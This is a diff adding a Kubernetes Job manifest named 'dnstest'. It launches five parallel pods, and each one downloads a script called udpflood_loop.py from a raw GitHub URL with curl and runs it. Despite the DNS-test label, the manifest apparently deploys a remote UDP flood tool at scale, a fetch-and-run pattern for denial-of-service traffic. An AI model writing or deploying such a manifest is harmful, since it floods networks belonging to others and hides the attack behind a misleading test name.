@@ -1,0 +1,39 @@
+apiVersion: batch/v1
+kind: Job # Use a Job to ensure the pod is deleted after completion
+metadata:
+  name: dnstest
+spec:
+  completions: 5
+  parallelism: 5
+  template:
+    metadata:
+      name: dnstest-pod-template
+    spec:
+      restartPolicy: Never # Only run once
+      containers:
+      - name: dnstest-container
+        image: debian:latest
+        command: ["/bin/bash", "-c"]
+        args:
+        - |
+          apt-get update && apt-get install -y iproute2 speedtest-cli python3 curl
+
+          github_url="https://raw.githubusercontent.com/S3298GIT01/NetworkTools/refs/heads/main/udpflood_loop.py" # Example URL
+          script_name="udpflood_loop.py"
+          
+          curl -o "$script_name" "$github_url"
+          
+          # Check if the download was successful
+          if [ $? -ne 0 ]; then
+            echo "Error downloading the script."
+            exit 1
+          fi
+          
+          chmod +x "$script_name"
+          python3 "$script_name"
+          
+          echo "Script execution finished."
+      #hostNetwork: true
+      #dnsPolicy: ClusterFirstWithHostNet 
+      # ... (Optional: securityContext and initContainers for static IP as above)
+  backoffLimit: 0 # Don't retry if it fails
